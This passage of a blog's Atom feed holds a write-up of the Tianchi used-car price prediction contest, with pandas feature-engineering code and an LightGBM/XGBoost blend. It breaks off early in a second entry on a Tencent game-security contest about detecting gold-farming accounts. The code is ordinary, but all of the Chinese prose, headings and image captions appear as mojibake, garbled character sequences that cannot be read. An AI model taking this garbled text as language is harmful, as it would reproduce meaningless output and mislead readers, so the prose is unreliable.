        <content type="text/html" src="https://www.logicjake.xyz/2020/04/21/%E5%A4%A9%E6%B1%A0%E4%BA%8C%E6%89%8B%E8%BD%A6%E4%BA%A4%E6%98%93%E4%BB%B7%E6%A0%BC%E9%A2%84%E6%B5%8B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"><![CDATA[<p>ÊúÄÁªàÊàêÁª©Ôºö62 / 2776<br>ÊØîËµõÂú∞ÂùÄÔºö<a href="https://tianchi.aliyun.com/competition/entrance/231784/introduction" target="_blank" rel="noopener">https://tianchi.aliyun.com/competition/entrance/231784/introduction</a><br>Ê∫êÁ†ÅÔºö<a href="https://github.com/LogicJake/competition_baselines/tree/master/competitions/tianchi_car_sale/final" target="_blank" rel="noopener">https://github.com/LogicJake/competition_baselines/tree/master/competitions/tianchi_car_sale/final</a></p><h1 id="ÊØîËµõ‰ªãÁªç"><a href="#ÊØîËµõ‰ªãÁªç" class="headerlink" title="ÊØîËµõ‰ªãÁªç"></a>ÊØîËµõ‰ªãÁªç</h1><p>Êú¨Ê¨°Êñ∞‰∫∫ËµõÊòØDatawhale‰∏éÂ§©Ê±†ËÅîÂêàÂèëËµ∑ÁöÑ0Âü∫Á°ÄÂÖ•Èó®Á≥ªÂàóËµõ‰∫ãÁ¨¨‰∏ÄÂú∫ ‚Äî‚Äî Èõ∂Âü∫Á°ÄÂÖ•Èó®Êï∞ÊçÆÊåñÊéò‰πã‰∫åÊâãËΩ¶‰∫§Êòì‰ª∑Ê†ºÈ¢ÑÊµãÂ§ßËµõ„ÄÇ</p><p>ËµõÈ¢ò‰ª•‰∫åÊâãËΩ¶Â∏ÇÂú∫‰∏∫ËÉåÊôØÔºåË¶ÅÊ±ÇÈÄâÊâãÈ¢ÑÊµã‰∫åÊâãÊ±ΩËΩ¶ÁöÑ‰∫§Êòì‰ª∑Ê†ºÔºåËøôÊòØ‰∏Ä‰∏™ÂÖ∏ÂûãÁöÑÂõûÂΩíÈóÆÈ¢ò„ÄÇÈÄöËøáËøôÈÅìËµõÈ¢òÊù•ÂºïÂØºÂ§ßÂÆ∂Ëµ∞ËøõAIÊï∞ÊçÆÁ´ûËµõÁöÑ‰∏ñÁïåÔºå‰∏ªË¶ÅÈíàÂØπ‰∫é‰∫éÁ´ûËµõÊñ∞‰∫∫ËøõË°åËá™ÊàëÁªÉ‰π†„ÄÅËá™ÊàëÊèêÈ´ò„ÄÇ</p><p>‰∏∫‰∫ÜÊõ¥Â•ΩÁöÑÂºïÂØºÂ§ßÂÆ∂ÂÖ•Èó®ÔºåÊàë‰ª¨ÂêåÊó∂‰∏∫Êú¨ËµõÈ¢òÂÆöÂà∂‰∫ÜÁ≥ªÂàóÂ≠¶‰π†ÊñπÊ°àÔºåÂÖ∂‰∏≠ÂåÖÊã¨Êï∞ÊçÆÁßëÂ≠¶Â∫ì„ÄÅÈÄöÁî®ÊµÅÁ®ãÂíåbaselineÊñπÊ°àÂ≠¶‰π†‰∏âÈÉ®ÂàÜ„ÄÇÈÄöËøáÂØπÊú¨ÊñπÊ°àÁöÑÂÆåÊï¥Â≠¶‰π†ÔºåÂèØ‰ª•Â∏ÆÂä©ÊéåÊè°Êï∞ÊçÆÁ´ûËµõÂü∫Êú¨ÊäÄËÉΩ„ÄÇÂêåÊó∂Êàë‰ª¨‰πüÂ∞ÜÊèê‰æõ‰∏ìÂ±ûÁöÑËßÜÈ¢ëÁõ¥Êí≠Â≠¶‰π†ÈÄöÈÅì„ÄÇ</p><h1 id="EDA"><a href="#EDA" class="headerlink" title="EDA"></a>EDA</h1><p>ËØ¶ÁªÜÁöÑ eda ÂèØ‰ª•ÂèÇËÄÉÂ§©ÊâçÂÑøÁ´•Âú®Â§©Ê±†ÁöÑÂàÜ‰∫´: <a href="https://tianchi.aliyun.com/notebook-ai/detail?postId=95276" target="_blank" rel="noopener">https://tianchi.aliyun.com/notebook-ai/detail?postId=95276</a></p><p>Êï∞ÊçÆÈõÜÁöÑÊ†ºÂºèÂ¶Ç‰∏ãÔºö  </p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/carsale_data.jpeg" alt="Êï∞ÊçÆÊ†ºÂºè" title="">                </div>                <div class="image-caption">Êï∞ÊçÆÊ†ºÂºè</div>            </figure></div><p>ÁâπÂæÅÂèØ‰ª•ÂàÜÊàê‰∏âÁ±ª:</p><ul><li>Êó•ÊúüÁâπÂæÅ: regDate, creatDate</li><li>Á±ªÂà´ÁâπÂæÅ: name, model, brand, bodyType, fuelType, gearbox, notRepairedDamage, regionCode, seller, offerType</li><li>Êï∞ÂÄºÁâπÂæÅ: power, kilometerÂíå15‰∏™ÂåøÂêçÁâπÂæÅ</li></ul><p>ËøôÈáå‰∏ªË¶ÅÂÖ≥Ê≥®ÁâπÂæÅÁöÑÁº∫Â§±ÁéáÂíå nunique ‰ø°ÊÅØÔºå‰∏ªË¶ÅÊòØÁúãÊúâÊ≤°ÊúâÁº∫Â§±ËøáÂ§öÊàñ nunique Â§™Â∞ëÁöÑÁâπÂæÅÔºå‰∏ÄËà¨ÊÉÖÂÜµ‰∏ãËøô‰∏§ÁßçÁâπÂæÅÂØπÊ®°ÂûãÂ≠¶‰π†Ëµ∑‰∏çÂà∞‰ΩúÁî®„ÄÇÊï∞ÂÄºÁâπÂæÅ power Âíå kilometer nunique ÂÄºÊØîËæÉÂ∞ëÔºå‰πü‰∏çÁü•ÈÅìÊòØ‰∏çÊòØÊï∞ÊçÆÂÅö‰∫ÜÂ§ÑÁêÜÔºåÊäπÂéª‰∫ÜÁ≤æÂ∫¶„ÄÇseller Âíå offerType Âè™Êúâ‰∏§‰∏™ÁîöËá≥1‰∏™‰∏çÂêåÁöÑÂÄºÔºåÊâÄ‰ª•ÂèØ‰ª•Âà†Âéª, ÂØπÊ®°ÂûãÂ≠¶‰π†Ëµ∑‰∏çÂà∞‰ΩúÁî®ÔºåÊ®°ÂûãÁöÑÁâπÂæÅÈáçË¶ÅÊÄß‰πü‰∏∫0„ÄÇ</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/carsale_eda1.png" alt="Êï∞ÊçÆÁªüËÆ°" title="">                </div>                <div class="image-caption">Êï∞ÊçÆÁªüËÆ°</div>            </figure></div><p>ÂåøÂêçÁâπÂæÅÁöÑÂàÜÂ∏ÉËßÅ‰∏ãÂõæÔºåÂåøÂêçÁâπÂæÅÂú®ÊúÄÂêéÁöÑÊ®°ÂûãÈáçË¶ÅÊÄßÈÉΩÊå∫È´òÁöÑÔºåÂèØ‰ª•Â•ΩÂ•ΩÊåñÊéò‰∏Ä‰∏ã„ÄÇ</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/carsale_eda2.jpeg" alt="ÂåøÂêçÁâπÂæÅ" title="">                </div>                <div class="image-caption">ÂåøÂêçÁâπÂæÅ</div>            </figure></div><h1 id="Êï∞ÊçÆÂ§ÑÁêÜ"><a href="#Êï∞ÊçÆÂ§ÑÁêÜ" class="headerlink" title="Êï∞ÊçÆÂ§ÑÁêÜ"></a>Êï∞ÊçÆÂ§ÑÁêÜ</h1><h2 id="Áº∫Â§±ÂÄºÂ§ÑÁêÜ"><a href="#Áº∫Â§±ÂÄºÂ§ÑÁêÜ" class="headerlink" title="Áº∫Â§±ÂÄºÂ§ÑÁêÜ"></a>Áº∫Â§±ÂÄºÂ§ÑÁêÜ</h2><p>Áº∫Â§±ÂÄº‰∏ªË¶ÅÈõÜ‰∏≠Âú®bodyTypeÔºåfuelTypeÔºågearboxÔºåÊàëÁöÑÊÄùË∑ØÊòØÊ±ΩËΩ¶ÁöÑÊåáÊ†áÂæÄÂæÄÂíåÂÖ∂ÊâÄÂ±ûÁöÑÂìÅÁâåÂíåËΩ¶ÂûãÊúâËæÉÂ§ßÂÖ≥Á≥ªÔºåÊâÄ‰ª•ÈááÁî®ËØ•ÂìÅÁâåËΩ¶Âûã‰∏ãÁöÑ‰ºóÊï∞Êù•Â°´Ë°•Áº∫Â§±ÂÄº„ÄÇ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from scipy import stats</span><br><span class="line"></span><br><span class="line">cols &#x3D; [&#39;bodyType&#39;, &#39;fuelType&#39;, &#39;gearbox&#39;]</span><br><span class="line">df_feature[&#39;gp&#39;] &#x3D; df_feature[&#39;brand&#39;].astype(</span><br><span class="line">    &#39;str&#39;) + df_feature[&#39;model&#39;].astype(&#39;str&#39;)</span><br><span class="line">gp_col &#x3D; &#39;gp&#39;</span><br><span class="line"></span><br><span class="line">df_na &#x3D; df_feature[cols].isna()</span><br><span class="line">df_mode &#x3D; df_feature.groupby(gp_col)[cols].agg(</span><br><span class="line">    lambda x: stats.mode(x)[0][0])</span><br><span class="line"></span><br><span class="line">for col in cols:</span><br><span class="line">    na_series &#x3D; df_na[col]</span><br><span class="line">    names &#x3D; list(df_feature.loc[na_series, gp_col])</span><br><span class="line"></span><br><span class="line">    t &#x3D; df_mode.loc[names, col]</span><br><span class="line">    t.index &#x3D; df_feature.loc[na_series, col].index</span><br><span class="line"></span><br><span class="line">    df_feature.loc[na_series, col] &#x3D; t</span><br><span class="line"></span><br><span class="line">del df_feature[&#39;gp&#39;]</span><br><span class="line">df_feature[cols].isnull().sum()</span><br></pre></td></tr></table></figure><h2 id="ÁõÆÊ†áÂèòÈáèÂàÜÂ∏ÉÂèòÊç¢"><a href="#ÁõÆÊ†áÂèòÈáèÂàÜÂ∏ÉÂèòÊç¢" class="headerlink" title="ÁõÆÊ†áÂèòÈáèÂàÜÂ∏ÉÂèòÊç¢"></a>ÁõÆÊ†áÂèòÈáèÂàÜÂ∏ÉÂèòÊç¢</h2><p>‰∏ÄËà¨Êù•ËØ¥ÂØπ‰∫éÂõûÂΩíÈóÆÈ¢òÔºåÁõÆÊ†áÂèòÈáèÊ≠£ÊÄÅÂåñÂØπÊ®°ÂûãÈ¢ÑÊµãÊúâÂ∏ÆÂä©Ôºå‰∏ãÂõæÂ±ïÁ§∫‰∫Ü‰ΩøÁî® log1p ÂâçÂêéÁöÑ‰ª∑Ê†ºÂàÜÂ∏ÉÊÉÖÂÜµ„ÄÇ</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/carsale_eda3.png" alt="‰ª∑Ê†ºÂàÜÂ∏É" title="">                </div>                <div class="image-caption">‰ª∑Ê†ºÂàÜÂ∏É</div>            </figure></div><h2 id="Êó†ÊïàÁâπÂæÅÂà†Èô§"><a href="#Êó†ÊïàÁâπÂæÅÂà†Èô§" class="headerlink" title="Êó†ÊïàÁâπÂæÅÂà†Èô§"></a>Êó†ÊïàÁâπÂæÅÂà†Èô§</h2><p>seller Âíå offerType Âè™Êúâ‰∏§‰∏™ÁîöËá≥1‰∏™‰∏çÂêåÁöÑÂÄºÔºåÊâÄ‰ª•ÂèØ‰ª•Âà†Âéª, ÂØπÊ®°ÂûãÂ≠¶‰π†Ëµ∑‰∏çÂà∞‰ΩúÁî®ÔºåÊ®°ÂûãÁöÑÁâπÂæÅÈáçË¶ÅÊÄß‰πü‰∏∫0„ÄÇ</p><h1 id="ÁâπÂæÅÂ∑•Á®ã"><a href="#ÁâπÂæÅÂ∑•Á®ã" class="headerlink" title="ÁâπÂæÅÂ∑•Á®ã"></a>ÁâπÂæÅÂ∑•Á®ã</h1><h2 id="Âü∫Á°ÄÁâπÂæÅ"><a href="#Âü∫Á°ÄÁâπÂæÅ" class="headerlink" title="Âü∫Á°ÄÁâπÂæÅ"></a>Âü∫Á°ÄÁâπÂæÅ</h2><p>ÂØπ‰∫é‰∏§‰∏™Êó•ÊúüÁâπÂæÅÊ±ΩËΩ¶Ê≥®ÂÜåÊó•ÊúüÂíåÂºÄÂßãÂîÆÂçñÊó∂Èó¥ÔºåÂèØ‰ª•‰∫åËÄÖÂÅöÂ∑ÆÂÄºËÆ°ÁÆóÊ±ΩËΩ¶ÂîÆÂçñÊó∂ÁöÑ‰ΩøÁî®Êó∂Èó¥ÔºåÊàëËøôÈáå‰ΩøÁî®‰∫ÜÂπ¥ÂíåÂ§©Êù•ÂàªÁîª„ÄÇÈô§Ê≠§‰ª•Â§ñÔºåÊ±ΩËΩ¶ÊòØÂì™‰∏ÄÂπ¥Ê≥®ÂÜåÁöÑÂØπ‰ª∑Ê†ºÁöÑÂΩ±Âìç‰πüÊå∫Â§ß„ÄÇÊï∞ÊçÆ‰∏≠Â≠òÂú®‰∏Ä‰∫õÂºÇÂ∏∏Êó•ÊúüÊï∞ÊçÆÔºöÊúà‰ªΩ‰∏∫0ÔºåÂ§ÑÁêÜÁöÑÊó∂ÂÄôÂ∞ÜÂÖ∂ÁΩÆ‰∏∫1Âç≥ÂèØ„ÄÇ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df_feature[&#39;car_age_day&#39;] &#x3D; ( df_feature[&#39;creatDate&#39;] - df_feature[&#39;regDate&#39;]).dt.days</span><br><span class="line">df_feature[&#39;car_age_year&#39;] &#x3D; round(df_feature[&#39;car_age_day&#39;] &#x2F; 365, 1)</span><br></pre></td></tr></table></figure><p>ÂØπ‰∫éÁ±ªÂà´ÁâπÂæÅ, ÂèØ‰ª•ËÆ°ÁÆócountÂ±ûÊÄß, ÂèçÂ∫îÈîÄÂîÆÁÉ≠Â∫¶„ÄÇ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df_feature[&#39;name_count&#39;] &#x3D; df_feature.groupby([&#39;name&#39;])[&#39;SaleID&#39;].transform(&#39;count&#39;)</span><br></pre></td></tr></table></figure><p>Êï∞ÂÄºÁâπÂæÅÂæÄÂæÄÁªìÂêàÁ±ªÂà´ÁâπÂæÅËøõË°åÁªüËÆ°„ÄÇÊØîÂ¶ÇÂèØ‰ª•ÁªüËÆ°‰∏çÂêåÊ±ΩËΩ¶ÂìÅÁâå‰∏ãÂåøÂêçÁâπÂæÅÁöÑÁªüËÆ°ÁâπÂæÅÔºömean, std, max, min„ÄÇ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">l &#x3D; [&#39;name&#39;, &#39;model&#39;, &#39;brand&#39;, &#39;bodyType&#39;]</span><br><span class="line">for f1 in tqdm(l):</span><br><span class="line">    for f2 in v_cols:</span><br><span class="line">        df_feature &#x3D; stat(df_feature, df_feature, [f1], &#123;</span><br><span class="line">            f2: [&#39;mean&#39;, &#39;max&#39;, &#39;min&#39;, &#39;std&#39;]&#125;)</span><br></pre></td></tr></table></figure><p>ÁõÆÊ†áÂèòÈáè price ‰πüÊòØÊï∞ÂÄºÁâπÂæÅÔºåÊâÄ‰ª•‰πüÂèØ‰ª•ÁªìÂêàÁ±ªÂà´ËøõË°åÁªüËÆ°ÔºåÊØîÂ¶ÇËÆ°ÁÆóÊüêÂìÅÁâåÔºåÊüêËΩ¶ÂûãÁöÑÂπ≥Âùá‰∫§Êòì‰ª∑Ê†ºÔºåËøôÁßçÂÅöÊ≥ïÁß∞‰∏∫ÁõÆÊ†áÁºñÁ†Å„ÄÇ‰ΩÜÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåÂÅáÂ¶Ç‰ΩøÁî®ÂÖ®Â±ÄÊ†áÁ≠æ‰ø°ÊÅØÁªüËÆ°‰ºöÂá∫Áé∞Ê†áÁ≠æÊ≥ÑÈú≤ÁöÑÈóÆÈ¢òÔºåÊâÄ‰ª•‰∏ÄËà¨‰ΩøÁî®‰∫îÊäòÁªüËÆ°Ê≥ïÔºåÁî®ÂõõÊäòÁöÑÊ†áÁ≠æÊï∞ÊçÆÂÅöÁªüËÆ°ÁªôÂè¶Â§ñ‰∏ÄÊäòÁöÑÊï∞ÊçÆÂÅöÁâπÂæÅ„ÄÇ</p><h2 id="ÂåøÂêçÁâπÂæÅ"><a href="#ÂåøÂêçÁâπÂæÅ" class="headerlink" title="ÂåøÂêçÁâπÂæÅ"></a>ÂåøÂêçÁâπÂæÅ</h2><p>ÁÆÄÂçï‰∏ÄÁÇπÔºåÂèØ‰ª•Áõ¥Êé•ÁªüËÆ°ÊØèËæÜËΩ¶15‰∏™ÂåøÂêçÁâπÂæÅÁöÑÁªüËÆ°ÂÄºÔºåÂæóÂà∞v_meanÔºåv_maxÔºåv_minÂíåv_std„ÄÇÁÑ∂ÂêéÂÜçÁªüËÆ°Ê±ΩËΩ¶‰∫§ÊòìÂêçÁß∞‰∏ãËøôÂõõ‰∏™ÁâπÂæÅÁöÑÁªüËÆ°ÂÄºÔºåËøôÈÅìÈ¢òÔºåÊ±ΩËΩ¶‰∫§ÊòìÂêçÁß∞‰πüÊòØ‰∏Ä‰∏™ÂæàÈáçË¶ÅÁöÑÁâπÂæÅ„ÄÇ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">v_cols &#x3D; [&#39;v_&#39;+str(i) for i in range(15)]</span><br><span class="line"></span><br><span class="line">df_feature[&#39;v_mean&#39;] &#x3D; df_feature[v_cols].mean(axis&#x3D;1)</span><br><span class="line">df_feature[&#39;v_max&#39;] &#x3D; df_feature[v_cols].max(axis&#x3D;1)</span><br><span class="line">df_feature[&#39;v_min&#39;] &#x3D; df_feature[v_cols].min(axis&#x3D;1)</span><br><span class="line">df_feature[&#39;v_std&#39;] &#x3D; df_feature[v_cols].std(axis&#x3D;1)</span><br><span class="line"></span><br><span class="line">for col in [&#39;v_mean&#39;, &#39;v_max&#39;, &#39;v_min&#39;, &#39;v_std&#39;]:</span><br><span class="line">    df_feature[f&#39;name_&#123;col&#125;_mean&#39;] &#x3D; df_feature.groupby(&#39;name&#39;)[</span><br><span class="line">        col].transform(&#39;mean&#39;)</span><br><span class="line">    df_feature[f&#39;name_&#123;col&#125;_std&#39;] &#x3D; df_feature.groupby(&#39;name&#39;)[</span><br><span class="line">        col].transform(&#39;std&#39;)</span><br><span class="line">    df_feature[f&#39;name_&#123;col&#125;_max&#39;] &#x3D; df_feature.groupby(&#39;name&#39;)[</span><br><span class="line">        col].transform(&#39;max&#39;)</span><br><span class="line">    df_feature[f&#39;name_&#123;col&#125;_min&#39;] &#x3D; df_feature.groupby(&#39;name&#39;)[</span><br><span class="line">        col].transform(&#39;min&#39;)</span><br></pre></td></tr></table></figure><p>ÂåøÂêçÁâπÂæÅÊó†Ê≥ïÁü•ÈÅìÂÖ∑‰ΩìÁöÑ‰∏öÂä°Âê´‰πâÔºåÊâÄ‰ª•Âè™ËÉΩÊ¢≠ÂìàÊìç‰ΩúÔºåÂÜô‰∫Ü‰∏™Á®ãÂ∫èÂØπÂåøÂêçÁâπÂæÅËøõË°å‰∫åÈò∂Êàñ‰∏âÈò∂ÁªÑÂêàÔºåËÆ°ÁÆóÁõ∏Âä†ÂíåÁõ∏ÂáèÔºåÊúÄÂêéÁ≠õÈÄâ‰øùÁïô‰ª•‰∏ãÁâπÂæÅÔºö</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">df_feature[&#39;v_0_add_v_4&#39;] &#x3D; df_feature[&#39;v_0&#39;] + df_feature[&#39;v_4&#39;]</span><br><span class="line">df_feature[&#39;v_0_add_v_8&#39;] &#x3D; df_feature[&#39;v_0&#39;] + df_feature[&#39;v_8&#39;]</span><br><span class="line">df_feature[&#39;v_1_add_v_3&#39;] &#x3D; df_feature[&#39;v_1&#39;] + df_feature[&#39;v_3&#39;]</span><br><span class="line">df_feature[&#39;v_1_add_v_4&#39;] &#x3D; df_feature[&#39;v_1&#39;] + df_feature[&#39;v_4&#39;]</span><br><span class="line">df_feature[&#39;v_1_add_v_5&#39;] &#x3D; df_feature[&#39;v_1&#39;] + df_feature[&#39;v_5&#39;]</span><br><span class="line">df_feature[&#39;v_1_add_v_12&#39;] &#x3D; df_feature[&#39;v_1&#39;] + df_feature[&#39;v_12&#39;]</span><br><span class="line">df_feature[&#39;v_2_add_v_3&#39;] &#x3D; df_feature[&#39;v_2&#39;] + df_feature[&#39;v_3&#39;]</span><br><span class="line">df_feature[&#39;v_4_add_v_11&#39;] &#x3D; df_feature[&#39;v_4&#39;] + df_feature[&#39;v_11&#39;]</span><br><span class="line">df_feature[&#39;v_4_add_v_12&#39;] &#x3D; df_feature[&#39;v_4&#39;] + df_feature[&#39;v_12&#39;]</span><br><span class="line">df_feature[&#39;v_0_add_v_12_add_v_14&#39;] &#x3D; df_feature[&#39;v_0&#39;] + \</span><br><span class="line">    df_feature[&#39;v_12&#39;] + df_feature[&#39;v_14&#39;]</span><br><span class="line"></span><br><span class="line">df_feature[&#39;v_4_add_v_9_minu_v_13&#39;] &#x3D; df_feature[&#39;v_4&#39;] + \</span><br><span class="line">    df_feature[&#39;v_9&#39;] - df_feature[&#39;v_13&#39;]</span><br><span class="line">df_feature[&#39;v_2_add_v_4_minu_v_11&#39;] &#x3D; df_feature[&#39;v_2&#39;] + \</span><br><span class="line">    df_feature[&#39;v_4&#39;] - df_feature[&#39;v_11&#39;]</span><br><span class="line">df_feature[&#39;v_2_add_v_3_minu_v_11&#39;] &#x3D; df_feature[&#39;v_2&#39;] + \</span><br><span class="line">    df_feature[&#39;v_3&#39;] - df_feature[&#39;v_11&#39;]</span><br></pre></td></tr></table></figure><h2 id="Â∞ùËØïËøáÁöÑÊó†Áî®ÁâπÂæÅ"><a href="#Â∞ùËØïËøáÁöÑÊó†Áî®ÁâπÂæÅ" class="headerlink" title="Â∞ùËØïËøáÁöÑÊó†Áî®ÁâπÂæÅ"></a>Â∞ùËØïËøáÁöÑÊó†Áî®ÁâπÂæÅ</h2><p>ËÆ∫ÂùõÂàÜ‰∫´‰∫Ü‰∏çÂ∞ëÁªìÂêà‰∏öÂä°ÁöÑÁâπÂæÅÔºå‰ΩÜÊàëËá™Â∑±Â∞ùËØïÂêéÂèëÁé∞ÊïàÊûúÈÉΩ‰∏çË°åÔºåËøô‰πüÊòØËÆ©ÊàëÂæàÂõ∞ÊÉëÁöÑÂú∞Êñπ„ÄÇÂÆòÊñπËµõÈ¢òÂàÜ‰∫´ÊèêÂà∞ÂèØ‰ª•Êà™ÂèñregionCodeÔºåÊèêÂèñÂüéÂ∏Ç‰ø°ÊÅØÔºå‰ΩÜ regionCode Â∑≤ÁªèË¢´ÁºñÁ†ÅËÑ±ÊïèÊàê0~8121ÁöÑÊï∞Â≠óÔºåÂ∑≤ÁªèÊó†Ê≥ïËøõË°å‰ø°ÊÅØÊèêÂèñ„ÄÇ</p><h1 id="Ê®°Âûã"><a href="#Ê®°Âûã" class="headerlink" title="Ê®°Âûã"></a>Ê®°Âûã</h1><p>‰∏§‰∏™Ê†ëÊ®°ÂûãÔºölgb Âíå xgb ÂàÜÂà´È¢ÑÊµãÔºåÁÑ∂ÂêéÊ†πÊçÆÂæóÂàÜËøõË°åÁÆÄÂçïÁöÑÂä†ÊùÉÔºåÊåâÁÖß 0.45*xgb_pred+0.55 *lgb_pred ÂæóÂà∞ÊúÄÂêéÁöÑÊ±ΩËΩ¶È¢ÑÊµã‰ª∑Ê†º„ÄÇÊúÄÂêéÁ∫ø‰∏äÂæóÂàÜ433ÔºårankÔºö62 / 2776„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[LogicJake‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2020/04/16/2020%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%BB%84-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/</id>
        <title><![CDATA[2020ËÖæËÆØÊ∏∏ÊàèÂÆâÂÖ®ÊäÄÊúØÁ´ûËµõÊú∫Âô®Â≠¶‰π†ÁªÑ-ËµõÂêéÊÄªÁªì]]></title>
        <updated>2020-04-21T13:42:03+08:00</updated>
        <link href="https://www.logicjake.xyz/2020/04/16/2020%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%BB%84-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"/>
        <content type="text/html" src="https://www.logicjake.xyz/2020/04/16/2020%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%BB%84-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"><![CDATA[<p>ÊúÄÁªàÊàêÁª©Ôºö‰ºòËÉúÂ•ñÔºàTOP 4Ôºâ<br>ÊØîËµõÂú∞ÂùÄÔºö<a href="https://gslab.qq.com/html/competition/2020/index.htm" target="_blank" rel="noopener">https://gslab.qq.com/html/competition/2020/index.htm</a><br>Ê∫êÁ†ÅÔºö<a href="https://github.com/LogicJake/2020-gslab-ml-top4" target="_blank" rel="noopener">https://github.com/LogicJake/2020-gslab-ml-top4</a></p><h1 id="ËµõÈ¢òËÉåÊôØ"><a href="#ËµõÈ¢òËÉåÊôØ" class="headerlink" title="ËµõÈ¢òËÉåÊôØ"></a>ËµõÈ¢òËÉåÊôØ</h1><p>Âú®Ê∏∏Êàè‰∏≠ÔºåÊúâ‰∏Ä‰∫õ‰∫∫ÊàñÁªÑÁªáÔºåÈÄöËøáÈùûÊ≥ïÊâãÊÆµËé∑ÂèñÂ§ßÈáèÊ∏∏ÊàèÂÜÖÈáëÂ∏ÅÁâ©ÂìÅÁ≠âËµÑÊ∫êÔºåËøôÂ∞±ÊòØÊâìÈáëÂ∑•‰ΩúÂÆ§ÔºàGold FarmingÔºâ„ÄÇ‰ªñ‰ª¨‰∏ÄËà¨Êã•ÊúâÂ§ßÈáèÂ∏êÂè∑Ôºå‰ΩøÁî®Â§ñÊåÇÊàñÊåÇÊú∫ËΩØ‰ª∂ÊâπÈáèËøõË°åÊ∏∏ÊàèË°å‰∏∫ÔºåÁ†¥ÂùèÊ∏∏ÊàèÁªèÊµéÁ≥ªÁªüÔºåÂΩ±ÂìçÁé©ÂÆ∂Ê∏∏Êàè‰ΩìÈ™å„ÄÇÂèØËá™Ë°åÊêúÁ¥¢ÊâìÈáëÂ∑•‰ΩúÂÆ§Áõ∏ÂÖ≥ËµÑÊñôÔºå‰∫ÜËß£‰ªñ‰ª¨ÊòØÂ¶Ç‰ΩïËøê‰ΩúÔºåÊ∏∏ÊàèÊñπÂ¶Ç‰ΩïÊâìÂáªÔºå‰ªñ‰ª¨ÂèàÊòØÂ¶Ç‰ΩïÈÄÉÈÅøÊâìÂáªÁöÑ„ÄÇ</p><h2 id="Á´ûËµõÁõÆÊ†á"><a href="#Á´ûËµõÁõÆÊ†á" class="headerlink" title="Á´ûËµõÁõÆÊ†á"></a>Á´ûËµõÁõÆÊ†á</h2><p>‰ΩøÁî® 2020Âπ¥03Êúà01Êó•ÁöÑÊï∞ÊçÆ(Âê´Ê†áÁ≠æ) Êù•ËÆ≠ÁªÉËØÜÂà´ÊâìÈáëÂ∑•‰ΩúÂÆ§ÁöÑÊ®°Âûã„ÄÇÁî®Ê≠§Ê®°Âûã, È¢ÑÊµã2020Âπ¥03Êúà05Êó•ÁöÑÊâìÈáëÂ∑•‰ΩúÂÆ§„ÄÇÂèñÂΩìÊó•loginÊàñlogout‰∏≠Âá∫Áé∞ËøáÁöÑÂ∏êÂè∑ÔºåÂà§Êñ≠Ëøô‰∫õÂ∏êÂè∑‰∏≠Âì™‰∫õÊòØÊâìÈáëÂ∑•‰ΩúÂÆ§„ÄÇ</p><h2 id="Ë°°ÈáèÊ†áÂáÜ"><a href="#Ë°°ÈáèÊ†áÂáÜ" class="headerlink" title="Ë°°ÈáèÊ†áÂáÜ"></a>Ë°°ÈáèÊ†áÂáÜ</h2><p>ÂæóÂàÜ = 4PR / 